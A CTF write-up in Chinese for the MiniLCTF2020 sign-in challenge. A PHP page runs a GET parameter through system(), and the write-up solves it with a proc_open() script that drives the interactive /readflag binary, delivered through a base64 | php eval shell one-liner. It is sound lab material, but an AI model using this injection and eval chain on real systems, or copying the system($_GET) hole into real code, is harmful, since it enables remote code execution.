# MiniLCTF2020 - 签到题

## 题目简述

页面把 GET 参数直接传给 `system()`，但容器没有外网，flag 又只能通过交互程序 `/readflag` 读取。程序要求两次确认并现场计算两个随机数之和，因此核心是使用 PHP `proc_open()` 同时控制子进程的标准输入和输出。

## 解题过程

入口源码只有：

```php
<?php system($_GET['a']); ?>
```

`/readflag` 的协议为：输入两次以 `y` 开头的字符串，读取 `then calculate A+B=`，提交正确结果，然后程序输出 `/flag`。可在目标上执行下面的 PHP：

```php
$d = array(
    array('pipe', 'r'),
    array('pipe', 'w'),
    array('pipe', 'w')
);
$p = proc_open('/readflag', $d, $pipes, '/');
if (is_resource($p)) {
    fwrite($pipes[0], "y\n");
    fwrite($pipes[0], "y\n");
    fgets($pipes[1]);
    fgets($pipes[1]);
    $line = fread($pipes[1], 21);
    $expr = 'return '.substr($line, 15, 5).';';
    fwrite($pipes[0], eval($expr)."\n");
    echo stream_get_contents($pipes[1]);
}
```

为了避免把多行 PHP 直接塞进 shell 参数，先在本地做 Base64，再让 `system()` 执行：

```sh
echo BASE64_CODE | base64 -d | php -r 'eval(stream_get_contents(STDIN));'
```

把整条命令 URL 编码后放入参数 `a`。脚本从提示中截取 `A+B`，实时计算并写回，不需要猜测随机数，最终标准输出中出现 flag。

## 方法总结

命令执行并不等于只能启动一次性命令。`proc_open()` 能为交互程序建立双向管道，适合处理问答、验证码和动态表达式。复现时应解析协议并计算答案，避免依赖“随机数范围很小所以循环重试”的脆弱做法。
